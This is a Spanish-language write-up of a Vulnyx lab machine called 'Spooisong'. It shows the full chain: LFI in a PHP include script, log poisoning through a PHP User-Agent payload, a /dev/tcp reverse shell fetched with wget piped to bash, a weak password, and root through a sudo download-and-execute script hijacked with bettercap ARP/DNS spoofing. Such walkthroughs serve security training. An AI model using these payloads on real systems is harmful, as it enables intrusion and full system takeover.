# Writeup: Spooisong (Vulnyx — Media)

Spooisong es una máquina **Media** que simula un servidor Linux con un servicio web Apache. El recorrido comienza con el descubrimiento de la máquina en la red local y el escaneo de puertos, que revela únicamente un servidor Apache. A través del archivo `robots.txt`, se descubre la ruta `/kavin`, que contiene un archivo `inc.php` vulnerable a **Local File Inclusion (LFI)**. Aunque la inclusión de archivos está restringida a extensiones `.php`, `.log` y `.conf`, es posible leer los logs del servidor y envenenarlos mediante el encabezado `User-Agent` para lograr **ejecución remota de comandos (RCE)**. Tras obtener una shell como `www-data`, se descubre que la contraseña del usuario `suraxddq` es su propio nombre de usuario, lo que permite escalar a ese usuario. Finalmente, se abusa de un permiso sudo sobre el script `/var/backups/dns`, que descarga y ejecuta contenido desde `sp00is0ng.nyx`, mediante un ataque de **DNS spoofing** con `bettercap` para redirigir el tráfico a nuestro servidor y obtener una shell como `root`.

---

## Fase 1: Descubrimiento

Realizamos un escaneo de red local con `arp-scan` para descubrir hosts activos:

```bash
sudo arp-scan --localnet
```

**Resultado:**

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 192.168.1.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.4     50:bb:b5:ab:8c:0c       (Unknown)
192.168.1.1     10:07:1d:92:cf:98       Fiberhome Telecommunication Technologies Co.,LTD
192.168.1.56    08:00:27:ba:26:39       PCS Systemtechnik GmbH
192.168.1.2     4a:d5:8e:f6:65:06       (Unknown: locally administered)
192.168.1.5     82:04:9c:5e:7f:5e       (Unknown: locally administered)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.128 seconds (120.30 hosts/sec). 5 responded
```

La MAC `08:00:27:ba:26:39` corresponde a **Oracle VirtualBox**, lo que indica que `192.168.1.56` es nuestra máquina objetivo.

Verificamos conectividad con un ping:

```bash
ping -c 1 192.168.1.56
```

**Resultado:**

```
PING 192.168.1.56 (192.168.1.56) 56(84) bytes of data.
64 bytes from 192.168.1.56: icmp_seq=1 ttl=64 time=1.60 ms
```

---

## Fase 2: Reconocimiento

Realizamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS --min-rate 500 -p- -Pn -n -vv 192.168.1.56 -oG allPorts
```

**Resultado:**

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:BA:26:39 (Oracle VirtualBox virtual NIC)
```

Solo el puerto 80 está abierto. Realizamos un escaneo de servicios:

```bash
nmap -sCV -p 80 192.168.1.56 -oN targeted
```

**Resultados clave:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/kavin
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

**Observaciones clave:**

- **Apache 2.4.62** en Debian.
- El archivo `robots.txt` revela la ruta **`/kavin`** como entrada prohibida para los buscadores.

---

## Fase 3: Enumeración web

### 3.1 Exploración de `/kavin`

Accedemos a `http://192.168.1.56/kavin/` y encontramos una página web estática con varias secciones. En el código fuente vemos las siguientes rutas:

```html
<li class="active"><a href="inc.php?i=index">Home</a></li>
<li><a href="inc.php?i=about">About Us</a></li>
<li><a href="inc.php?i=services">Services</a></li>
<li><a href="inc.php?i=portfolio">Portfolio</a></li>
<li><a href="inc.php?i=pricing">Pricing</a></li>
<li><a href="inc.php?i=contact">Contact</a></li>
```

**Hallazgo:** Todas las páginas se cargan a través del archivo `inc.php` con el parámetro `i`, lo que sugiere una posible vulnerabilidad de **Local File Inclusion (LFI)**.

### 3.2 Prueba de LFI

Probamos a incluir el archivo `/etc/passwd`:

```bash
curl -s 'http://192.168.1.56/kavin/inc.php?i=/etc/passwd'
```

**Resultado:** No hay salida. Esto sugiere que el archivo no existe con las extensiones permitidas o que la inclusión está restringida.

### 3.3 Fuzzing con FFUF

Realizamos un fuzzing para encontrar qué archivos son accesibles:

```bash
ffuf -u 'http://192.168.1.56/kavin/inc.php?i=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw 1 -s
```

**Resultado:**

```
/etc/apache2/sites-enabled/000-default
/etc/apache2/sites-available/default-ssl
/etc/security/limits
/etc/security/group
```

**Hallazgo:** Solo podemos leer archivos `.conf`, ya que el servidor añade esta extensión si no encuentra `.php` o `.log`.

### 3.4 Lectura de la configuración de Apache

```http
GET /kavin/inc.php?i=/etc/apache2/sites-enabled/000-default HTTP/1.1
Host: 192.168.1.56
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Resultado:**

```apache
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	ErrorLog /var/www/kavin-logs/error.log
	CustomLog /var/www/kavin-logs/access.log combined
</VirtualHost>
```

**Hallazgo crítico:** Los logs de Apache se almacenan en `/var/www/kavin-logs/`. Esto nos da una ruta predecible para intentar un ataque de **log poisoning**.

---

## Fase 4: Análisis del código vulnerable

### 4.1 Obtención del código fuente de `inc.php`

A través de la RCE obtenida posteriormente, pudimos leer el código fuente de `inc.php`:

```php
<?php

    $file = $_GET["i"];

    if (file_exists($file . ".php")) {
        include($file . ".php");
    }

    elseif (file_exists($file . ".log")) {
        include($file . ".log");
    }

    elseif (file_exists($file . ".conf")) {
        include($file . ".conf");
    }

    else {
        echo "";
    }
?>
```

### 4.2 Análisis de la vulnerabilidad

**Funcionamiento del código:**

1. Se recibe el parámetro `i` desde la URL.
2. Se comprueba si existe el archivo `<i>.php`. Si existe, se **incluye** con `include()`.
3. Si no existe `.php`, se comprueba `<i>.log` y se incluye.
4. Si no existe `.log`, se comprueba `<i>.conf` y se incluye.
5. Si ninguna existe, no muestra nada.

**Vulnerabilidad:** El código permite incluir archivos controlados por el usuario si existen con las extensiones `.php`, `.log` o `.conf`. La función `include()` en PHP ejecuta el contenido del archivo como código PHP si el archivo contiene etiquetas `<?php ... ?>`.

**Riesgo:** Combinado con la capacidad de escribir en un archivo `.log` (como los logs de Apache), un atacante puede inyectar código PHP en el log y luego incluirlo para ejecutarlo.

### 4.3 Restricciones

- Solo se pueden incluir archivos con extensiones `.php`, `.log` o `.conf`.
- No se puede truncar la extensión con un byte nulo (`%00`) porque PHP moderno lo bloquea.
- No se puede usar un wrapper (`php://filter`, `data://`) porque `file_exists()` los bloquea.

---

## Fase 5: Log Poisoning

### 5.1 Lectura del log de acceso

Probamos a leer el log de acceso de Apache:

```http
GET /kavin/inc.php?i=/var/www/kavin-logs/access HTTP/1.1
Host: 192.168.1.56
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Resultado:**

```
192.168.1.10 - - [12/Oct/2026:05:14:19 +0200] "GET /kavin/inc.php?i=/etc/apache2/sites-enabled/000-default HTTP/1.1" 200 950 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
192.168.1.10 - - [12/Oct/2026:05:14:35 +0200] "GET /kavin/inc.php?i=/etc/apache2/sites-enabled/000-default HTTP/1.1" 200 950 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
192.168.1.10 - - [12/Oct/2026:05:21:10 +0200] "GET /kavin/inc.php?i=/etc/opt/microsoft/omsagent/sysconf/omi_mapping.json HTTP/1.1" 200 147 "-" "Fuzz Faster U Fool v2.1.0-dev"
192.168.1.10 - - [12/Oct/2026:05:21:10 +0200] "GET /kavin/inc.php?i=/etc/opt/microsoft/omsagent/sysconf/lad-logrotate.conf HTTP/1.1" 200 147 "-" "Fuzz Faster U Fool v2.1.0-dev"
```

**Hallazgo:** Podemos leer el log de acceso. Además, el log incluye el **User-Agent** de cada petición, lo que nos permite inyectar código PHP en el log.

### 5.2 Inyección de código PHP en el log

Enviamos una petición con el User-Agent modificado para incluir código PHP:

```http
GET /kavin/inc.php?i=/var/www/kavin-logs/access HTTP/1.1
Host: 192.168.1.56
User-Agent: <?php system('id');  ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Resultado:**

```
192.168.1.10 - - [12/Oct/2026:05:47:43 +0200] "GET /kavin/inc.php?i=/var/www/kavin-logs/access HTTP/1.1" 200 89136 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
"
```

**Hallazgo crítico:** El código PHP inyectado en el User-Agent ha sido **ejecutado**, y podemos ver el resultado del comando `id`: `uid=33(www-data)`.

**Explicación:** Cuando `inc.php` incluye el archivo de log a través de `include()`, PHP interpreta el contenido del log. Como el log contiene el User-Agent con código PHP válido (`<?php system('id'); ?>`), se ejecuta como código PHP.

---

## Fase 6: Ejecución Remota de Comandos (RCE)

### 6.1 Preparación del script de reverse shell

En nuestra máquina Kali, creamos un script `shell.sh`:

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.10/443 0>&1
EOF
```

Levantamos un servidor HTTP para servir el script:

```bash
python3 -m http.server
```

### 6.2 Inyección del comando para descargar y ejecutar el script

Enviamos una petición con el User-Agent modificado:

```http
GET /kavin/inc.php?i=/var/www/kavin-logs/access HTTP/1.1
Host: 192.168.1.56
User-Agent: <?php system('wget -O - 192.168.1.10:8000/sh|bash');  ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

**Resultado en el servidor HTTP:**

```
192.168.1.56 - - [12/Oct/2026 00:02:30] "GET /shell.sh HTTP/1.1" 200
```

### 6.3 Reverse shell

Iniciamos un listener en nuestra máquina Kali:

```bash
nc -lnvp 443
```

**Resultado:**

```
listening on [any] 443 ...
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.56] 59856
bash: cannot set terminal process group (535): Inappropriate ioctl for device
bash: no job control in this shell
www-data@spooisong:/var/www/html/kavin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Somos el usuario **`www-data`**.

---

## Fase 7: Escalada a `suraxddq`

### 7.1 Enumeración de usuarios

Listamos los usuarios del sistema:

```bash
cat /etc/passwd | grep bin/bash
```

**Resultado:**

```
root:x:0:0:root:/root:/bin/bash
suraxddq:x:1000:1000:suraxddq:/home/suraxddq:/bin/bash
```

Existen dos usuarios con shell: **`root`** y **`suraxddq`**.

### 7.2 Prueba de contraseña débil

Probamos si la contraseña del usuario `suraxddq` es su propio nombre de usuario:

```bash
su suraxddq
Password: suraxddq
```

**Resultado:**

```bash
suraxddq@spooisong:/var/www/html/kavin$ id
uid=1000(suraxddq) gid=1000(suraxddq) grupos=1000(suraxddq)
```

**Hallazgo:** La contraseña de `suraxddq` es su propio nombre de usuario. Esta es una mala práctica de seguridad extremadamente común.

---

## Fase 8: Escalada a root

### 8.1 Verificación de permisos sudo

```bash
sudo -l
```

**Resultado:**

```
Matching Defaults entries for suraxddq on spooisong:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User suraxddq may run the following commands on spooisong:
    (root) NOPASSWD: /var/backups/dns
```

**Hallazgo crítico:** El usuario `suraxddq` puede ejecutar `/var/backups/dns` como `root` sin contraseña.

### 8.2 Análisis del script `/var/backups/dns`

```bash
cat /var/backups/dns
```

**Resultado:**

```bash
#!/bin/bash

/usr/bin/wget -O- "http://sp00is0ng.nyx/configure" | /usr/bin/sh
```

**Análisis del script:**

1. Descarga el contenido de `http://sp00is0ng.nyx/configure` usando `wget`.
2. Pasa la salida directamente a `sh` para su ejecución.

**Vulnerabilidad:** El script descarga y ejecuta código desde un dominio (`sp00is0ng.nyx`) que **no está configurado en DNS**. Si podemos controlar la resolución de ese dominio, podremos hacer que el script descargue y ejecute nuestro propio código como `root`.

### 8.3 Prueba de ejecución

Ejecutamos el script para ver qué sucede:

```bash
sudo /var/backups/dns
```

**Resultado:**

```
--2026-10-12 06:14:14--  http://sp00is0ng.nyx/configure
Resolviendo sp00is0ng.nyx (sp00is0ng.nyx)... falló: Nombre o servicio desconocido.
wget: no se pudo resolver la dirección del equipo «sp00is0ng.nyx»
```

**Hallazgo:** El dominio `sp00is0ng.nyx` no resuelve. Si controlamos su resolución, podemos redirigir el tráfico a nuestro servidor.

### 8.4 Preparación del payload

Creamos un archivo `configure` con el payload que queremos ejecutar como `root`:

```bash
cat > configure << 'EOF'
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
EOF
```

**Explicación del payload:** Este comando copia `/bin/bash` a `/tmp/rootbash` y le aplica el bit **SUID**. Cuando cualquier usuario ejecute `/tmp/rootbash`, se ejecutará con los privilegios del propietario (`root`).

Levantamos un servidor HTTP para servir el archivo `configure`:

```bash
python3 -m http.server 80
```

### 8.5 DNS Spoofing con Bettercap

**Bettercap** es una herramienta de ataque de red que permite realizar **ARP spoofing**, **DNS spoofing** y otras técnicas de MITM (Man-In-The-Middle).

Ejecutamos Bettercap:

```bash
sudo ~/go/bin/bettercap -iface eth0
```

Dentro de Bettercap, configuramos el ataque:

```
set arp.spoof.targets 192.168.1.56
set dns.spoof.domains sp00is0ng.nyx
set dns.spoof.address 192.168.1.10
arp.spoof on
```

**Resultado:**

```
[00:36:45] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
[00:36:45] [endpoint.new] endpoint 192.168.1.56 detected as 08:00:27:ba:26:39 (PCS Systemtechnik GmbH).
[00:37:12] [sys.log] [inf] dns.spoof sp00is0ng.nyx -> 192.168.1.10
```

**Explicación del ataque:**

1. **ARP Spoofing**: Bettercap envenena la tabla ARP de la máquina víctima (`192.168.1.56`) para hacerle creer que nuestra máquina (`192.168.1.10`) es el gateway.
2. **DNS Spoofing**: Cuando la víctima intenta resolver `sp00is0ng.nyx`, nuestro servidor DNS falso responde con la IP `192.168.1.10`.
3. **Resultado**: La víctima conecta a nuestro servidor HTTP para descargar `/configure`.

Verificamos que el DNS spoofing funciona desde la víctima:

```bash
ping -c 1 sp00is0ng.nyx
```

**Resultado:**

```
PING sp00is0ng.nyx (192.168.1.10) 56(84) bytes of data.
64 bytes from 192.168.1.10: icmp_seq=1 ttl=64 time=8.19 ms
```

### 8.6 Ejecución del script como root

Ejecutamos el script `/var/backups/dns` como `root`:

```bash
sudo /var/backups/dns
```

**Resultado:**

```
--2026-10-12 06:14:14--  http://sp00is0ng.nyx/configure
Resolviendo sp00is0ng.nyx (sp00is0ng.nyx)... 192.168.1.10
Connecting to sp00is0ng.nyx (sp00is0ng.nyx)|192.168.1.10|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: XX [text/plain]
Saving to: 'STDOUT'

-                   100%[===================>]      XX  --.-KB/s    in 0s      

2026-10-12 06:14:14 (XX MB/s) - written to stdout [XX/XX]
```

El archivo `configure` ha sido descargado y ejecutado como `root`. Verificamos que el binario SUID se ha creado:

```bash
ls -la /tmp/rootbash
```

**Resultado:**

```
-rwsr-xr-x 1 root root 1265648 oct 12 06:14 /tmp/rootbash
```

### 8.7 Obtención de shell root

```bash
/tmp/rootbash -p
```

**Resultado:**

```bash
rootbash-5.2# id
uid=1000(suraxddq) gid=1000(suraxddq) euid=0(root) grupos=1000(suraxddq)
rootbash-5.2# ls /root/
root.txt
```

Obtenemos una shell como **root** y leemos la flag.

---

## 📌 Conclusión

Spooisong es una máquina **Media** que combina:

1. **Enumeración de red** con `arp-scan` y Nmap.
2. **Descubrimiento de rutas** mediante `robots.txt` (`/kavin`).
3. **Local File Inclusion (LFI)** en `inc.php` con restricciones a `.php`, `.log` y `.conf`.
4. **Log Poisoning** mediante el encabezado `User-Agent` para obtener RCE.
5. **Contraseña débil** del usuario `suraxddq` (su propio nombre de usuario).
6. **Abuso de permisos sudo** sobre `/var/backups/dns`.
7. **DNS Spoofing** con `bettercap` para redirigir el tráfico a nuestro servidor.
8. **Ejecución de código como root** mediante la descarga de un script malicioso.

---

## 📚 Lecciones aprendidas

1. **Los archivos `robots.txt` no deben revelar rutas sensibles**  
   El archivo `robots.txt` listaba `/kavin` como entrada prohibida, lo que paradójicamente reveló la existencia de la aplicación. Las rutas sensibles no deben incluirse en `robots.txt`; deben protegerse mediante autenticación o eliminarse.

2. **La inclusión de archivos locales (LFI) debe validarse con listas blancas**  
   El código `inc.php` permitía incluir cualquier archivo con extensión `.php`, `.log` o `.conf`. La solución correcta es usar una **lista blanca** de archivos permitidos, en lugar de confiar en la extensión.

3. **Los logs no deben ser accesibles desde la web**  
   Los logs de Apache se almacenaban en `/var/www/kavin-logs/`, dentro del alcance del servidor web. Los logs deben estar fuera del directorio raíz del servidor web y no ser accesibles desde el exterior.

4. **El encabezado `User-Agent` es un vector de ataque común**  
   El contenido del `User-Agent` se registra en los logs sin sanitización. Combinado con un LFI, esto permite ejecutar código PHP arbitrario. Los encabezados deben escaparse antes de escribirlos en los logs, o los logs deben estar protegidos.

5. **Las contraseñas débiles son una vulnerabilidad crítica**  
   La contraseña de `suraxddq` era su propio nombre de usuario. Las organizaciones deben implementar políticas de contraseñas robustas que prohíban el uso de datos predecibles como el nombre de usuario, el nombre real o fechas de nacimiento.

6. **Los scripts que descargan y ejecutan código de Internet son peligrosos**  
   El script `/var/backups/dns` descargaba contenido de un dominio no confiable y lo ejecutaba como `root`. Esto es una vulnerabilidad crítica, ya que un atacante puede redirigir el tráfico DNS para controlar el contenido descargado. Los scripts deben usar HTTPS con validación de certificados y verificar la integridad del contenido (firmas GPG, hashes).

7. **El DNS spoofing es efectivo en redes locales sin protección**  
   La red no contaba con protecciones como **DNSSEC** o **Dynamic ARP Inspection (DAI)**. Estas tecnologías deben implementarse para prevenir ataques de MITM en redes locales.

8. **Bettercap es una herramienta potente para ataques de red**  
   La combinación de ARP spoofing y DNS spoofing permite redirigir el tráfico de la víctima a nuestro servidor. Esta técnica es común en entornos de pentesting interno y demuestra la importancia de la seguridad de red.


---

**Writeup completado.** La máquina fue resuelta exitosamente.
